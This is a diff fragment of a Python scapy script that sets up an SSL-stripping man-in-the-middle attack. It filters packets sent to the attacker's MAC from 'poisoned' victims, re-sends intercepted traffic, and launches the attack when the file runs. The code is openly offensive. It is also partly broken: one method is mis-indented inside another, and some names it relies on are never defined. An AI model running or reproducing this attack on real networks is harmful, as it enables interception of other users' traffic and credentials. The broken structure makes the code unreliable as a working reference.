@@ -2,15 +2,31 @@ from scapy.all import *
 from scapy.layers.inet import IP
 from scapy.layers.inet import TCP
 import threading
+from Tkinter import*
+import sys
+import os
 import time
 import requests
 import netifaces
 from math import log
 
 
-class sslstrip():
 
-def getsslVictims(self):
+class sslstrip():
+	def __init__(self):
+		self.ssl_strip = False
+		self.sslVictims = []
+		self.sslattack()
+	
+	#Filters out TCP packets that were meant for a poisoned target
+	def sniff_filter(self, pkt):
+		#Obtain TCP packets intercepted by us
+		if(self.ssl_strip):
+			return IP in pkt and pkt[IP].dst !=self.ATTACKER_IP and pkt[Ether].dst == self.ATTACKER_MAC and (DNS in pkt or pkt[IP].src not in [vict["IP"] for vict in self.sslVictims])
+		else:
+			return IP in pkt and pkt[IP].dst != self.ATTACKER_IP and pkt[Ether].dst == self.ATTACKER_MAC
+
+		def getsslVictims(self):
 		# self.sslVictims = [{ "IP": "10.0.2.4", "MAC": self.get_mac("10.0.2.4")}]
 		# return
 
@@ -78,3 +94,9 @@ def getsslVictims(self):
 					send(re, iface=self.NETWORK_INTERFACE)
 
 		sniff(lfilter=self.ssl_filter, prn=sslStrip, iface=self.NETWORK_INTERFACE)
+
+
+
+
+
+attack = sslstrip()
